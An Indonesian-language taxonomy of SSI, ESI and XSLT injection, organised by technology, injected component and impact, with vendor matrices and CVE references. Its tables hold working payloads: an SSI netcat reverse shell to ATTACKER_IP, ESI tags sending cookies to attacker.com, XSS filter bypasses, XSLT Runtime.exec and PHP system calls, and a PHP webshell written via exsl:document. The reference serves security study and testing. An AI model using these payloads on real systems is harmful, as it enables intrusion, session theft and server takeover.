---
title: "SSI/ESI/XSLT Injection"
description: ""
---

## Struktur Klasifikasi

Taksonomi ini mencakup tiga primitif injeksi sisi server yang berbeda namun saling berkaitan — **Server-Side Includes (SSI)**, **Edge Side Includes (ESI)**, dan **XSLT (Extensible Stylesheet Language Transformations)** — yang memiliki satu properti struktural yang sama: ketiganya memproses **direktif markup atau logika transformasi di sisi server** sebelum respons dikirimkan ke klien. Ketika penyerang dapat menyuntikkan konten ke dalam aliran yang diproses oleh mesin-mesin ini, dampaknya bisa berkisar dari pengungkapan informasi hingga remote code execution penuh.

Dokumen ini disusun berdasarkan tiga sumbu:

**Sumbu 1 (Primer — Menyusun Dokumen): Teknologi Pemrosesan.** Setiap teknologi beroperasi pada lapisan tumpukan infrastruktur yang berbeda (web server, cache/CDN edge, application-level XML processor), memiliki sintaks yang berbeda, dan menghadirkan primitif eksploitasi yang unik. Para praktisi menjumpainya dalam konteks yang berbeda secara fundamental, sehingga sumbu primer mencerminkan kenyataan tersebut.

**Sumbu 2 (Cross-Cutting — Diterapkan Dalam Setiap Bagian): Target Mutasi.** Dalam setiap teknologi, subtipe diklasifikasikan berdasarkan *komponen struktural apa* yang sedang disuntikkan atau dimanipulasi: antarmuka eksekusi perintah, path penyertaan sumber daya, interpolasi variabel, kontrol header/respons, resolusi entitas, pemanggilan fungsi ekstensi, atau evaluasi dinamis.

**Sumbu 3 (Pemetaan — Menghubungkan ke Dampak): Skenario Serangan.** Setiap mutasi dipetakan ke dampak yang dapat dicapai: RCE, pembacaan file, SSRF, pembajakan sesi, bypass XSS/filter, cache poisoning, atau denial of service. Sumbu ini disajikan dalam tabel pemetaan lintas teknologi (§5).

### Ringkasan Target Mutasi (Sumbu 2)

| Target Mutasi | Deskripsi | Teknologi yang Berlaku |
|----------------|-------------|------------------------|
| **Command/Code Execution** | Pemanggilan langsung perintah OS atau kode arbitrer melalui antarmuka eksekusi bawaan | SSI (`exec`), XSLT (extension functions, script blocks) |
| **Resource Inclusion** | Mengambil dan menyematkan file lokal atau konten jarak jauh ke dalam respons | SSI (`include`), ESI (`esi:include`), XSLT (`document()`) |
| **Variable/Environment Interpolation** | Mengekstrak variabel server, HTTP header, cookie, atau data lingkungan | SSI (`echo`, `printenv`), ESI (`esi:vars`, `$(...)`) |
| **Header/Response Manipulation** | Menyuntikkan atau memodifikasi HTTP response header, status code, atau content framing | ESI (`request_header`, `add_header`), XSLT (`xsl:output`) |
| **Entity/DTD Resolution** | Mengeksploitasi pemrosesan XML external entity untuk membaca file atau memicu SSRF | XSLT (injeksi DOCTYPE), chaining ESI+XSLT |
| **Extension Function Invocation** | Memanggil fungsi native bahasa (PHP, Java, C#) melalui extension API processor | XSLT (semua processor dengan ekstensi aktif) |
| **Dynamic Evaluation** | Evaluasi runtime dari ekspresi yang dibangun dari input yang dikendalikan penyerang | XSLT (`xsl:evaluate`, `saxon:evaluate`) |
| **Markup Obfuscation** | Menggunakan sintaks komentar, encoding, atau nesting untuk mem-bypass filter sambil tetap mempertahankan interpretasi sisi server | ESI (`<!--esi-->`), SSI (varian encoding) |

---

## §1. Injeksi Direktif Server-Side Includes (SSI)

SSI adalah mekanisme scripting sisi server ringan di mana direktif yang tertanam dalam file HTML diproses oleh web server sebelum dikirimkan. Direktif mengikuti format `<!--#directive param="value" -->`. Ketika input yang dikontrol pengguna mencapai file yang diproses oleh mesin SSI (biasanya diidentifikasi dengan ekstensi `.shtml`, `.shtm`, atau `.stm`, meskipun tipe file apa pun dapat dikonfigurasi), penyerang dapat menyuntikkan direktif arbitrer.

SSI didukung oleh Apache (`mod_include`), Nginx (`ngx_http_ssi_module`), IIS (`ssinc.dll`), LiteSpeed, dan beberapa web server lainnya. Meskipun merupakan teknologi lama dari tahun 1990-an, SSI tetap diaktifkan di banyak lingkungan produksi, terutama pada sistem lama dan deployment modern yang salah dikonfigurasi.

### §1-1. Eksekusi Perintah via `exec`

Direktif `exec` adalah primitif SSI paling berbahaya, yang menyediakan eksekusi perintah OS langsung di bawah identitas proses web server.

| Subtipe | Mekanisme | Contoh | Kondisi Utama |
|---------|-----------|---------|---------------|
| **exec cmd** | Mengeksekusi perintah shell arbitrer via `/bin/sh` (Unix) atau `cmd.exe` (Windows) | `<!--#exec cmd="id" -->` | `Options +Includes` tanpa `IncludesNOEXEC` (Apache); SSI exec diaktifkan (Nginx) |
| **exec cgi** | Mengeksekusi skrip CGI pada path yang ditentukan, mewarisi konteks eksekusi server | `<!--#exec cgi="/cgi-bin/attack.cgi" -->` | Eksekusi CGI harus diaktifkan; penyerang perlu menempatkan atau merujuk sebuah skrip |
| **Reverse shell via exec** | Merangkai perintah shell untuk membuat koneksi outbound | `<!--#exec cmd="mkfifo /tmp/f;nc ATTACKER_IP PORT 0</tmp/f\|/bin/bash 1>/tmp/f;rm /tmp/f" -->` | Network egress dari server; `exec cmd` diaktifkan |
| **Chained command execution** | Menggunakan operator shell (`;`, `&&`, `\|`, backtick) untuk merantai beberapa perintah dalam satu direktif `exec` | `<!--#exec cmd="cat /etc/passwd; whoami; uname -a" -->` | Sama seperti `exec cmd` |

**Perilaku spesifik server:**
- **Apache**: `exec cmd` dikendalikan oleh direktif `Options +Includes`. Opsi `IncludesNOEXEC` secara khusus menonaktifkan `exec cmd` dan `exec cgi` sambil mengizinkan direktif SSI lainnya. Sejak Apache 2.4, `mod_include` dapat dibatasi lebih lanjut dengan kontrol `SSILegacyExprParser` dan conditional expression.
- **Nginx**: SSI diaktifkan via `ssi on;` dalam konfigurasi. Direktif `exec` **tidak didukung secara native** oleh modul SSI Nginx — Nginx mengimplementasikan subset SSI yang berfokus pada `include`, `set`, `if`, `echo`, dan `block`/`endblock`. Eksekusi perintah melalui Nginx SSI memerlukan konfigurasi kustom atau modul pihak ketiga.
- **IIS**: Secara historis rentan melalui `ssinc.dll`. Buffer overflow kritis pada IIS 4.0/5.0 (`ssinc.dll`) memungkinkan eskalasi hak akses ke level sistem via direktif SSI yang terlalu panjang.

### §1-2. Penyertaan File dan Sumber Daya

Direktif penyertaan SSI menyematkan konten file atau URL lain ke dalam respons, memungkinkan pengungkapan informasi dan potensi penyertaan kode.

| Subtipe | Mekanisme | Contoh | Kondisi Utama |
|---------|-----------|---------|---------------|
| **include virtual** | Menyertakan output dari virtual path yang diselesaikan server (dapat memicu pemrosesan CGI/SSI pada sumber daya yang disertakan) | `<!--#include virtual="/etc/passwd" -->` | Path harus dapat diselesaikan oleh URI handler server |
| **include file** | Menyertakan file menggunakan path relatif filesystem dari dokumen saat ini | `<!--#include file="../../../etc/passwd" -->` | Path traversal bergantung pada konfigurasi OS dan chroot |
| **Remote resource inclusion** | Menggunakan `include virtual` dengan handler yang mengambil konten jarak jauh (misalnya, melalui reverse proxy atau SSI subrequest) | `<!--#include virtual="http://internal-server/admin" -->` | Konfigurasi server harus mengizinkan subrequest berbasis URI |
| **flastmod / fsize** | Membocorkan metadata (waktu modifikasi, ukuran file) dari file arbitrer tanpa menyertakan konten | `<!--#flastmod file="/etc/shadow" -->` | File harus ada dan dapat diakses via stat |

**Pertimbangan path traversal**: Direktif `include file` biasanya membatasi path agar relatif dan berada dalam document root, namun server yang salah dikonfigurasi mungkin mengizinkan urutan traversal. Direktif `include virtual` diproses melalui mesin resolusi URI server, yang mungkin menerapkan URL decoding, canonicalization, atau pemetaan handler — setiap langkah berpotensi memunculkan peluang bypass.

### §1-3. Ekstraksi Variabel dan Lingkungan

SSI menyediakan akses ke variabel server, variabel lingkungan, dan metadata HTTP request melalui direktif interpolasi.

| Subtipe | Mekanisme | Contoh | Kondisi Utama |
|---------|-----------|---------|---------------|
| **echo var** | Menampilkan nilai variabel server/lingkungan yang ditentukan | `<!--#echo var="DOCUMENT_ROOT" -->` | Pemrosesan SSI diaktifkan |
| **printenv** | Membuang semua variabel lingkungan yang tersedia beserta nilainya dalam satu output | `<!--#printenv -->` | Menyediakan sidik jari server yang komprehensif |
| **HTTP header extraction** | Mengakses request header melalui variabel HTTP_* | `<!--#echo var="HTTP_COOKIE" -->` | Header dipetakan secara otomatis ke variabel SSI |
| **Server metadata** | Mengekstrak detail konfigurasi server | `<!--#echo var="SERVER_SOFTWARE" -->`, `<!--#echo var="DOCUMENT_NAME" -->` | Variabel CGI/SSI standar |

**Variabel kunci untuk eksploitasi:**
- `DOCUMENT_ROOT` — mengungkap tata letak filesystem
- `SERVER_SOFTWARE` — mengidentifikasi versi web server untuk serangan terarah
- `REMOTE_ADDR`, `REMOTE_HOST` — reconnaissance jaringan
- `HTTP_COOKIE`, `HTTP_AUTHORIZATION` — ekstraksi kredensial
- `QUERY_STRING`, `REQUEST_URI` — analisis titik injeksi
- `DATE_LOCAL`, `DATE_GMT` — informasi waktu

### §1-4. Manipulasi Variabel dan Logika Kondisional

SSI mendukung penetapan variabel dan ekspresi kondisional, memungkinkan konstruksi serangan multi-langkah.

| Subtipe | Mekanisme | Contoh | Kondisi Utama |
|---------|-----------|---------|---------------|
| **set var** | Menetapkan nilai ke variabel bernama untuk interpolasi selanjutnya | `<!--#set var="cmd" value="cat /etc/passwd" -->` | Pemrosesan SSI diaktifkan |
| **Conditional execution** | Menggunakan `if`/`elif`/`else`/`endif` untuk mengeksekusi direktif berdasarkan nilai variabel atau pencocokan regex | `<!--#if expr="$QUERY_STRING = /admin/" --><!--#exec cmd="id" --><!--#endif -->` | Apache SSI expression parser |
| **config** | Memodifikasi perilaku pemrosesan SSI: format pesan kesalahan, format waktu, format ukuran file | `<!--#config errmsg="[custom error]" -->` | Mengungkap status pemrosesan SSI; dapat menyembunyikan indikator kesalahan |

Logika kondisional memungkinkan eksploitasi yang terarah — misalnya, mengeksekusi payload berbeda berdasarkan sistem operasi server (terdeteksi via `SERVER_SOFTWARE`) atau hanya memicu ketika kondisi tertentu terpenuhi untuk menghindari deteksi.

### §1-5. Teknik Penghindaran Filter

Payload injeksi SSI dapat diobfuskasi untuk mem-bypass WAF dan validasi input.

| Subtipe | Mekanisme | Kondisi Utama |
|---------|-----------|---------------|
| **URL encoding** | Encode `<!--#` sebagai `%3C%21--%23` atau double-encode; server mungkin mendekode sebelum pemrosesan SSI | WAF mendekode secara berbeda dari web server |
| **Whitespace manipulation** | Menyisipkan tab, newline, atau spasi ekstra dalam struktur direktif | Parser SSI mentoleransi whitespace yang fleksibel |
| **Case variation** | Mencampur kapitalisasi dalam nama direktif di mana server tidak case-sensitive | Perilaku parser spesifik server |
| **Nested comment injection** | Menyematkan direktif SSI dalam komentar HTML untuk menyembunyikannya dari scanner permukaan | `<!-- <!--#exec cmd="id" --> -->` |
| **Partial injection** | Menyuntikkan fragmen di beberapa field input yang bergabung pada halaman yang dirender | Beberapa titik refleksi pada halaman yang diproses SSI yang sama |

---

## §2. Injeksi Tag Edge Side Includes (ESI)

ESI adalah bahasa markup berbasis XML yang dirancang untuk perakitan konten dinamis di lapisan cache/CDN. Tag ESI yang tertanam dalam respons dari server asal diinterpretasikan oleh cache server intermediary (surrogate) sebelum respons mencapai klien. Properti keamanan kritis: **mesin ESI mempercayai semua tag ESI dalam respons upstream**, sehingga tidak mungkin bagi cache server untuk membedakan tag sah dari tag yang disuntikkan.

Injeksi ESI terjadi ketika input yang dikontrol penyerang direfleksikan dalam respons yang melewati surrogate pemrosesan ESI. Karena ESI beroperasi di lapisan cache — antara server asal dan klien — ia tidak terlihat oleh perlindungan sisi klien dan dapat mem-bypass mekanisme keamanan browser seperti flag cookie HttpOnly dan filter XSS.

### §2-1. Remote Resource Inclusion via `esi:include`

Tag `esi:include` adalah primitif ESI fundamental, yang menginstruksikan surrogate untuk mengambil sumber daya jarak jauh dan menyematkannya dalam respons.

| Subtipe | Mekanisme | Contoh | Kondisi Utama |
|---------|-----------|---------|---------------|
| **Basic SSRF** | Memaksa surrogate membuat HTTP request ke URL yang ditentukan penyerang | `<esi:include src="http://attacker.com/collect" />` | Pemrosesan ESI diaktifkan; tidak ada host whitelist (Squid, Akamai, NodeJS) |
| **Internal network probing** | Menggunakan `esi:include` untuk mengakses layanan internal yang tidak terekspos ke internet | `<esi:include src="http://169.254.169.254/latest/meta-data/" />` | Surrogate memiliki akses jaringan ke target internal |
| **Local file disclosure** | Merujuk file lokal melalui atribut `src` | `<esi:include src="secret.txt" />` | Implementasi mendukung URI relatif atau file:// |
| **Error-based enumeration** | Menggunakan `esi:try`/`esi:attempt`/`esi:except` untuk menangani request yang gagal secara diam-diam sambil melakukan probing | `<esi:try><esi:attempt><esi:include src="http://internal:PORT/"/></esi:attempt><esi:except>closed</esi:except></esi:try>` | Surrogate mendukung `esi:try` (dukungan vendor terbatas) |
| **Chained inclusion** | Menumpuk tag `esi:include` untuk membuat rantai request multi-hop | `esi:include` rekursif dalam sumber daya yang diambil | Surrogate mengikuti rantai penyertaan; tidak ada batas kedalaman (CVE-2025-49763: kelelahan memori ATS dari nesting tak terbatas) |
| **Alt/onerror fallback abuse** | Menggunakan atribut `alt` untuk membuat request sekunder ketika yang utama gagal | `<esi:include src="http://unreachable/" alt="http://attacker.com/fallback" />` | Surrogate mendukung atribut `alt` |

**Perilaku `esi:include` spesifik vendor:**

| Vendor | Include | Host Whitelist | Catatan |
|--------|----------|---------------|-------|
| **Squid** | Ya | Tidak | SSRF penuh; juga mendukung upstream header dan cookie |
| **Varnish** | Ya | Ya | Restriktif; hanya 3 aksi ESI total |
| **Akamai** | Ya | Tidak | Fitur kaya; batas ukuran 1MB; maks 5 level nesting |
| **Fastly** | Ya | Ya | Whitelist mengurangi cakupan SSRF |
| **Apache Traffic Server** | Ya | Tidak | Tidak ada dukungan `alt`/`onerror`; rentan terhadap DoS nesting |
| **Oracle WebCache** | Ya | Tidak | Mendukung spesifikasi ESI penuh + ekstensi kustom |
| **IBM WebSphere** | Ya | Dapat dikonfigurasi | Enterprise ESI caching dengan delegasi surrogate |
| **NodeJS esi** | Ya | Tidak | Mendukung cookie; tidak ada host whitelist |
| **ESIGate** | Ya | Tidak | Mendukung integrasi XSLT (§2-6) |

### §2-2. Interpolasi Variabel dan Eksfiltrasi Data via `esi:vars`

Interpolasi variabel ESI memungkinkan akses ke HTTP request header, cookie, dan metadata server — yang kritis, ini terjadi di lapisan cache, **mem-bypass perlindungan yang diterapkan browser seperti HttpOnly**.

| Subtipe | Mekanisme | Contoh | Kondisi Utama |
|---------|-----------|---------|---------------|
| **Full cookie extraction** | Menginterpolasi semua cookie, termasuk yang diberi flag HttpOnly | `<esi:vars>$(HTTP_COOKIE)</esi:vars>` | Surrogate mendukung `esi:vars`; cookie dalam scope |
| **Specific cookie theft** | Mengekstrak cookie bernama individual | `<esi:include src="http://attacker.com/?c=$(HTTP_COOKIE{'JSESSIONID'})" />` | Surrogate mendukung sintaks variabel cookie |
| **Authorization header theft** | Mengekstrak Bearer token atau kredensial Basic auth | `<esi:vars>$(HTTP_HEADER{Authorization})</esi:vars>` | Surrogate mendukung interpolasi variabel header |
| **User-Agent / Referer extraction** | Mengeksfiltrasi metadata klien untuk fingerprinting | `<esi:vars>$(HTTP_HEADER{User-Agent})</esi:vars>` | Sama seperti di atas |
| **Exfiltration via inclusion** | Menyematkan data yang dicuri dalam parameter URL `esi:include` yang dikirim ke server penyerang | `<esi:include src="http://attacker.com/steal?cookie=$(HTTP_COOKIE)" />` | Menggabungkan `esi:include` dengan interpolasi variabel |

**Mekanisme bypass HttpOnly:** Penggantian variabel ESI terjadi di sisi server dalam lapisan surrogate/cache, bukan di mesin JavaScript browser. Oleh karena itu, cookie yang ditandai sebagai `HttpOnly` — yang hanya mencegah akses JavaScript — sepenuhnya dapat diakses oleh ekspresi ESI `$(HTTP_COOKIE)`. Ini memungkinkan **pembajakan sesi tanpa JavaScript**: penyerang mengekstrak token sesi melalui ESI tanpa eksekusi kode sisi klien.

**Matriks dukungan vendor untuk variabel:**

| Vendor | Vars | Cookie | Upstream Headers |
|--------|------|---------|------------------|
| Squid | Ya | Ya | Ya |
| Varnish | Tidak | Tidak | Ya |
| Fastly | Tidak | Tidak | Tidak |
| Akamai | Ya | Ya | Tidak |
| NodeJS esi | Ya | Ya | Ya |

### §2-3. Peningkatan XSS dan Bypass Filter

Tag ESI dapat dijadikan senjata untuk mem-bypass perlindungan XSS sisi klien dan WAF melalui beberapa mekanisme.

| Subtipe | Mekanisme | Contoh | Kondisi Utama |
|---------|-----------|---------|---------------|
| **ESI comment splitting** | Menyisipkan `<!--esi-->` dalam tag HTML untuk memecah pencocokan pola WAF sementara surrogate menghapus komentar, menyisakan HTML yang dapat dieksekusi | `<scr<!--esi-->ipt>alert(1)</sc<!--esi-->ript>` | WAF tidak memahami pemrosesan ESI; surrogate menghapus komentar |
| **Variable-based tag construction** | Menggunakan `esi:assign` dan `esi:vars` untuk membangun fragmen HTML berbahaya dari variabel | `x=<esi:assign name="v" value="'cript'"/><s<esi:vars name="$(v)"/>>alert(1)</s<esi:vars name="$(v)"/>>` | Surrogate mendukung `esi:assign` + `esi:vars` |
| **Image error handler injection** | Menggabungkan komentar ESI dengan event handler | `<img+src=x+on<!--esi-->error=alert(1)>` | Penghapusan komentar ESI terjadi sebelum parsing browser |
| **Reflected XSS amplification** | Menyuntikkan payload ekstraksi variabel ESI dalam konteks reflected XSS untuk mencuri cookie di sisi server | `<esi:include src="http://attacker.com/xss.html">` di mana `xss.html` berisi ESI yang mengeksfiltrasi cookie | Input yang direfleksikan melewati surrogate pemrosesan ESI |
| **URL-decoded ESI in reflected context** | Menggunakan URL encoding untuk tag ESI yang didekode sebelum pemrosesan surrogate | `<!--esi/$url_decode('"><svg/onload=prompt(1)>')/-->` | Surrogate memproses nilai yang didekode URL |

**Insight kunci:** Bentuk komentar `<!--esi ... -->` adalah primitif bypass paling universal karena hampir semua surrogate pemrosesan ESI menginterpretasinya, sementara terlihat seperti komentar HTML yang tidak berbahaya bagi WAF dan sanitizer. Ini menciptakan **diskrepansi parsing** fundamental antara lapisan keamanan (yang melihat komentar HTML) dan lapisan pemrosesan (yang mengeksekusi logika ESI).

### §2-4. Manipulasi HTTP Header dan Respons

ESI menyediakan primitif untuk memodifikasi request dan response header di lapisan cache.

| Subtipe | Mekanisme | Contoh | Kondisi Utama |
|---------|-----------|---------|---------------|
| **Header injection via `add_header`** | Menambahkan response header arbitrer, memungkinkan open redirect, override content-type, atau bypass CSP | `<!--esi $add_header('Location','http://attacker.com') -->` | Surrogate mendukung fungsi `$add_header()` |
| **Content-Type override** | Mengubah tipe konten respons untuk mengaktifkan interpretasi payload | `<!--esi/$add_header('Content-Type','text/html')/$url_decode('"><svg/onload=prompt(1)>')/-->` | Sama seperti di atas |
| **Request header manipulation** | Memodifikasi header pada subrequest yang dibuat oleh surrogate | `<esi:request_header name="Host" value="attacker.com"/>` | Oracle WebCache (CVE-2019-2438) |
| **CRLF injection in headers** | Menyuntikkan newline untuk menambahkan header tambahan atau memisah respons | `<esi:include src="http://anything.com%0d%0aX-Forwarded-For:%20127.0.0.1%0d%0aJunk:%20junk/"/>` | Surrogate tidak menyanitasi URL dalam atribut `src` |
| **Host header override** | Mengganti Host header pada subrequest surrogate untuk mengarahkannya ke infrastruktur penyerang | `<esi:request_header name="User-Agent" value="12345\r\nHost: attacker.com"/>` | Injeksi newline dalam atribut `value` |

### §2-5. Inline Fragment Overwriting

Tag `esi:inline` memungkinkan pembuatan atau penimpaan fragmen cache, memungkinkan manipulasi konten yang persisten.

| Subtipe | Mekanisme | Contoh | Kondisi Utama |
|---------|-----------|---------|---------------|
| **Virtual page creation** | Membuat sumber daya cache baru yang dapat diakses via atribut `name`-nya | `<esi:inline name="/attack.html" fetchable="yes"><script>document.location='http://attacker.com/'+document.cookie</script></esi:inline>` | Oracle WebCache 11g (unik untuk implementasi ini) |
| **JavaScript file poisoning** | Menimpa file JavaScript yang sering di-cache untuk menyuntikkan XSS persisten di semua halaman yang mereferensikannya | Sama seperti di atas, menargetkan sumber daya `.js` | XSS persisten via penimpaan file di level cache |
| **Resource pollution** | Membuat atau memodifikasi sumber daya cache yang disertakan halaman lain, mencapai propagasi lateral | Sumber daya yang ditarget disertakan via tag `<script src="...">` atau `<link>` | Menciptakan vektor serangan persisten tanpa modifikasi asal |

**Keterbatasan vendor:** Aksi `esi:inline` **hanya** didukung oleh Oracle WebCache. Apache Traffic Server, Squid, Varnish, dan Fastly tidak mengimplementasikannya.

### §2-6. Chaining ESI ke XSLT

ESI mendukung pemrosesan XSLT melalui parameter `dca` (dynamic content assembly), menciptakan jembatan dari injeksi ESI ke permukaan serangan XSLT penuh (§3).

| Subtipe | Mekanisme | Contoh | Kondisi Utama |
|---------|-----------|---------|---------------|
| **Remote XSLT stylesheet loading** | Menggunakan `dca="xslt"` untuk menginstruksikan surrogate menerapkan XSLT stylesheet yang dikontrol penyerang ke konten XML yang diambil | `<esi:include src="http://attacker.com/payload.xml" dca="xslt" stylesheet="http://attacker.com/rce.xsl" />` | Surrogate mendukung `dca="xslt"` (ESIGate, beberapa enterprise surrogate) |
| **XXE via XSLT** | Stylesheet yang dimuat berisi deklarasi XXE yang diselesaikan oleh XSLT processor surrogate | Stylesheet berisi `<!DOCTYPE xxe [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>` | XSLT processor tidak menonaktifkan external entity |
| **RCE via XSLT extension functions** | Stylesheet XSLT memanggil Java Runtime atau extension function lainnya (§3-3) | Stylesheet menggunakan namespace ekstensi Xalan/Saxon untuk `Runtime.exec()` | ESI surrogate menggunakan Java-based XSLT processor dengan ekstensi diaktifkan |

Mekanisme chaining ini sangat berbahaya karena mengescalasi injeksi ESI — yang sendirian biasanya hanya mencapai SSRF dan eksfiltrasi data — ke RCE penuh melalui kemampuan eksekusi kode XSLT processor.

### §2-7. Denial of Service

Pemrosesan ESI dapat disalahgunakan untuk kelelahan sumber daya dan gangguan layanan.

| Subtipe | Mekanisme | Contoh | CVE/Referensi |
|---------|-----------|---------|---------------|
| **Recursive inclusion bomb** | Menyuntikkan tag `esi:include` yang merujuk sumber daya yang berisi lebih banyak tag `esi:include`, menciptakan pengambilan eksponensial | Tag `<esi:include>` yang bersarang tanpa henti | CVE-2025-49763 (kelelahan memori Apache Traffic Server) |
| **Pointer dereference crashes** | Respons ESI yang malformed memicu NULL pointer dereference atau penanganan pointer yang salah dalam parser surrogate | Respons HTTP yang dibuat dari asal yang dikontrol penyerang | CVE-2018-1000024, CVE-2018-1000027 (Squid sebelum 4.0.23) |
| **Out-of-bounds write** | Penetapan variabel ESI yang malformed menyebabkan memory corruption di surrogate | Payload penetapan variabel ESI yang dibuat | CVE-2024-45802 (penanganan variabel ESI Squid) |
| **Resource amplification** | Satu request memicu banyak subrequest `esi:include`, memperkuat beban pada server asal | Beberapa tag `esi:include` dalam satu payload yang disuntikkan | Surrogate memproses semua include tanpa rate limiting |

---

## §3. Injeksi XSLT Stylesheet

XSLT (Extensible Stylesheet Language Transformations) adalah bahasa Turing-complete yang dirancang untuk mentransformasi dokumen XML. Ketika aplikasi menerima XSLT stylesheet yang disuplai pengguna atau mengizinkan injeksi ke dalam stylesheet yang ada, kekuatan komputasi penuh XSLT — ditambah mekanisme ekstensi khusus processor — menjadi tersedia bagi penyerang.

Injeksi XSLT lebih kuat dari injeksi SSI atau ESI karena XSLT processor biasanya mendukung:
- **Akses file system** via fungsi `document()`
- **Akses jaringan** via resolusi URI
- **Eksekusi kode** via extension function bahasa-spesifik
- **Evaluasi dinamis** via `xsl:evaluate` (XSLT 3.0)
- **Resolusi external entity** via XXE
- **Penyematan skrip** dalam processor tertentu (`msxsl:script` di .NET)

Permukaan serangan bersifat **bergantung pada processor**: setiap mesin XSLT (libxslt, Saxon, Xalan, MSXML) mengekspos mekanisme ekstensi yang berbeda dan memiliki konfigurasi keamanan default yang berbeda.

### §3-1. Fingerprinting Processor dan Reconnaissance

Sebelum eksploitasi, mengidentifikasi versi dan kemampuan XSLT processor sangat penting untuk memilih primitif serangan yang tepat.

| Subtipe | Mekanisme | Contoh |
|---------|-----------|---------|
| **Version detection** | Mengquery properti sistem XSLT untuk mengidentifikasi processor dan versi | `<xsl:value-of select="system-property('xsl:version')"/>` |
| **Vendor identification** | Mengungkap nama mesin XSLT dan URL | `<xsl:value-of select="system-property('xsl:vendor')"/>` / `<xsl:value-of select="system-property('xsl:vendor-url')"/>` |
| **Feature probing** | Menguji ketersediaan extension function tertentu dengan mengamati pesan kesalahan vs. eksekusi sukses | Coba panggilan extension function; analisis error vs. hasil |
| **Extension namespace probing** | Mendeklarasikan namespace spesifik processor dan menguji apakah dikenali | Deklarasikan `xmlns:php="http://php.net/xsl"` dan coba panggilan |

**Pemetaan identifikasi processor:**

| Vendor String | Processor | Bahasa/Platform | Primitif Serangan Utama |
|--------------|-----------|------------------|----------------------|
| `libxslt` | libxslt (GNOME) | C / PHP / Python | Fungsi EXSLT, fungsi PHP (jika terdaftar), `document()` |
| `Apache Software Foundation` | Xalan | Java | Refleksi Java via namespace ekstensi |
| `SAXON` / `Saxonica` | Saxon-HE/PE/EE | Java / .NET | Ekstensi reflektif (PE/EE), `xsl:evaluate` (XSLT 3.0) |
| `Microsoft` | MSXML / System.Xml | .NET / COM | `msxsl:script` dengan C#/VB.NET/JScript |

### §3-2. Akses File dan SSRF via `document()`

Fungsi `document()` adalah fungsi XSLT 1.0 standar yang mengambil dan mem-parse XML dari URI, memungkinkan pembacaan file lokal dan server-side request forgery.

| Subtipe | Mekanisme | Contoh | Kondisi Utama |
|---------|-----------|---------|---------------|
| **Local file read** | Merujuk path file lokal; jika file adalah XML yang valid, konten dikembalikan langsung | `<xsl:copy-of select="document('/etc/passwd')"/>` | File harus dapat di-parse sebagai XML, atau pesan kesalahan membocorkan konten parsial |
| **Error-based file disclosure** | File non-XML memicu kesalahan parser yang menyertakan baris pertama file | `<xsl:copy-of select="document('/etc/shadow')"/>` → kesalahan berisi baris pertama | Pesan kesalahan parser tidak disembunyikan |
| **Windows file read** | Menggunakan path Windows-spesifik | `<xsl:copy-of select="document('file:///c:/windows/win.ini')"/>` | OS Windows; skema URI `file://` diizinkan |
| **HTTP SSRF** | Menggunakan `document()` untuk membuat HTTP request ke host arbitrer | `<xsl:copy-of select="document('http://169.254.169.254/latest/meta-data/')"/>` | Resolusi URI eksternal tidak dinonaktifkan |
| **Port scanning** | Melakukan probe pada host/port internal dengan menganalisis perbedaan kesalahan (connection refused vs. timeout vs. respons) | `<xsl:copy-of select="document('http://internal:22')"/>` | Akses jaringan dari processor |
| **Protocol probing** | Menguji berbagai skema URI (file://, http://, https://, ftp://, gopher://) | `<xsl:copy-of select="document('gopher://...')"/>` | Dukungan skema bervariasi menurut processor |
| **UNC path access (Windows)** | Mengakses SMB share atau memicu autentikasi NTLM ke server yang dikontrol penyerang | `<xsl:copy-of select="document('\\\\attacker\\share\\file')"/>` | Lingkungan Windows; SMB outbound diizinkan |

**Keterbatasan utama:** `document()` mencoba mem-parse konten yang diambil sebagai XML. Konten non-XML menyebabkan kesalahan parsing, namun pesan kesalahan sering membocorkan konten parsial (biasanya baris pertama). Ini menjadikan `document()` primitif pengungkapan informasi yang andal bahkan untuk file non-XML, meskipun mengembalikan data lebih sedikit dari mekanisme pembacaan file langsung.

### §3-3. Eksekusi Kode Berbasis Extension Function

XSLT processor mengekspos pemanggilan fungsi native bahasa melalui namespace ekstensi — vektor RCE utama untuk injeksi XSLT. Mekanisme spesifik bergantung pada processor:

| Processor | Platform | Mekanisme Ekstensi | Contoh RCE | Kondisi Utama |
|-----------|----------|-------------------|-------------|---------------|
| **libxslt** | PHP / Python / C | `php:function()` memanggil fungsi PHP terdaftar apa pun | `<xsl:value-of select="php:function('system','id')"/>` (xmlns:php="http://php.net/xsl") | `registerPHPFunctions()` dipanggil tanpa allowlist |
| **Xalan** | Java | URI namespace dipetakan langsung ke kelas Java: `http://xml.apache.org/xalan/java/{class}` | `rt:exec(rt:getRuntime(),'id')` (xmlns:rt=".../java.lang.Runtime") | Ekstensi diaktifkan (default) |
| **Saxon PE/EE** | Java / .NET | Ekstensi reflektif memetakan panggilan XPath ke metode Java | `Runtime:exec(Runtime:getRuntime(),'whoami')` (xmlns:Runtime="java:java.lang.Runtime") | Saxon-PE atau Saxon-EE (bukan HE); `xsl:evaluate` tersedia dalam mode XSLT 3.0 pada semua edisi |
| **MSXML / System.Xml** | .NET | `msxsl:script` menyematkan kode C#/VB.NET/JScript arbitrer | `<msxsl:script language="C#">Process.Start("cmd","/c whoami")</msxsl:script>` | `XsltSettings.TrustedXslt` atau `XsltSettings(true, true)` — default menonaktifkan scripting |

Semua processor juga mendukung `document()` untuk pembacaan file/SSRF (§3-2) dan mungkin mengizinkan lookup JNDI (Xalan), penulisan file via EXSLT `exsl:document` (libxslt), atau evaluasi XPath dinamis via `xsl:evaluate`/`saxon:evaluate` (Saxon).

### §3-4. Penulisan File via Ekstensi EXSLT

EXSLT (Extensions to XSLT) menyediakan elemen output `document` yang menulis hasil transformasi ke file.

| Subtipe | Mekanisme | Contoh | Kondisi Utama |
|---------|-----------|---------|---------------|
| **exsl:document file write** | Menulis konten arbitrer ke file di server | `<exsl:document href="/var/www/shell.php" method="text"><?php system($_GET['c']); ?></exsl:document>` dengan `xmlns:exsl="http://exslt.org/common"` | libxslt dengan dukungan EXSLT; izin tulis ke path target |
| **Webshell deployment** | Menggabungkan penulisan file dengan konten webshell PHP untuk membuat akses persisten | Tulis shell PHP/JSP/ASP ke direktori yang dapat diakses web | Path web root diketahui; izin tulis |
| **Configuration overwrite** | Menimpa file konfigurasi server untuk mengubah perilaku | Targetkan Apache `.htaccess`, Nginx include, atau konfigurasi aplikasi | Izin tulis ke direktori konfigurasi |
